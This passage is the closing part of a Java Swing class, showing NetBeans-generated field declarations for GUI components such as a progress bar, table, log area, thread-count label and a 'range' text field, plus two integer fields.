    private javax.swing.JProgressBar jProgressBar1;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JSplitPane jSplitPane1;
    private javax.swing.JTable jTable1;
    private javax.swing.JTextArea log;
    private javax.swing.JLabel pauseButton;
    private javax.swing.JSpinner poolTop;
    private javax.swing.JTextField range;
    private javax.swing.JLabel thread_count;
    // End of variables declaration//GEN-END:variables
    private int x;
    private int y;
}
